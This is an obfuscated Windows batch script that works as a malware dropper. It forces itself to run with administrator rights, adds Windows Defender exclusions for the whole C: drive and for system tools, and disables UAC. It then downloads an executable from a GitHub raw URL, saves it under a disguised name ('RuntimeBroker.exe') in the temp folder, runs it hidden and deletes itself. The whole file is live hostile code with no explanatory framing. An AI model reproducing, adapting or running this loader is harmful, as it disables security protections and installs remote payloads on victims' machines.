@echo off & setlocal enableDelayedExpansion
set "nJTw=SESSION" & set "AgBsx=>nul" & set "LZWD=2>&1" & set "yxoV=NET"
%yxoV% %nJTw% %AgBsx% %LZWD%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "yNtCD=bar" & set "zsuBh=baz" & set "syPXz=foo" & set "GpRzi=qux" & rem GztXpHA WhuMXQ Cua
set "KIiC=powershell -ExecutionPolicy Bypass -Command"
set "mqhKH=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "KgF='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "rOK='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!KIiC! "!mqhKH! !KgF! !rOK!" %AgBsx% %LZWD%
set "mFdE=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "uyZO=-Name 'EnableLUA' -Value 0"
!KIiC! "!mFdE! !uyZO!" %AgBsx% %LZWD%
set "hTcp=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!KIiC! "!hTcp!" %AgBsx% %LZWD%
if !errorlevel! neq 0 (goto %a%)
set "tZSl=timeout /t" & !tZSl! 2 %AgBsx% %LZWD%
set "zpP=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "lCeP=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "fCp=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!KIiC! "!zpP! !lCeP! !fCp!" %AgBsx% %LZWD%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!tZSl! 1 %AgBsx% %LZWD% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %AgBsx% %LZWD%
del /f /q "%~f0" %AgBsx% %LZWD%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %AgBsx% %LZWD%
if !errorlevel! neq 0 (!tZSl! 3 %AgBsx% %LZWD% & goto %b%)
exit /b
